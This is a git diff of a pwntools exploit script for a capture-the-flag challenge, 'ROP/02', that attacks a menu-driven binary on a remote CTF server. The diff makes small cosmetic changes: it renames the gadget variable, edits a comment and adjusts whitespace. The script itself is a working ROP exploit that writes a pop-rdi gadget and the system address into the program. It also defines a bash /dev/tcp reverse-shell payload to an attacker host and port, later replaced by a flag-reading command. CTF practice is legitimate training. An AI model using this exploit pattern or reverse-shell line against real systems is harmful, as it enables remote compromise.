@@ -3,7 +3,7 @@ from pwn import *
 from struct import pack
 def q(addr): return pack('<Q', addr)
 
-print "=== ROP/02: Solution ===\n"
+print "=== ROP/02: Solution ==="
 """
 Explanation:
 
@@ -55,9 +55,9 @@ REMOTE = ('ctf.segfault.me', 3002)
 TARGET = '../bin/motd_v0.2' # Binary path (local)
 LHOST  = "10.0.0.105"       # Reverse shell host
 LPORT  = "8888"             # Reverse shell port
-DEBUG  = False               # Follow along in GDB
+DEBUG  = False              # Follow along in GDB
 
-PIVOT  = 0x4017b3 # ROPGadget.py --binary motd_v0.2 | grep 'pop rdi' # pop rdi; ret
+RDI    = 0x4017b3 # ROPGadget.py --binary motd_v0.2 | grep 'pop rdi' # pop rdi; ret
 SYSTEM = 0x401652 # main jumps to system for us => Doesn't matter if libc is ASLR.
 PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1\x00".format(LHOST, LPORT)
 PAYLOAD = "cat ~/flag.txt; exit\x00"
@@ -81,10 +81,10 @@ p.sendline("3")
 p.sendline("1")
 p.sendline(str(SYSTEM))
 
-# insert gadget
+# insert gadget for pop RDI
 p.sendline("3")
 p.sendline("0")
-p.sendline(str(PIVOT)) # Pivot Gadget
+p.sendline(str(RDI))
 p.sendline("4")
 print p.readall()
 
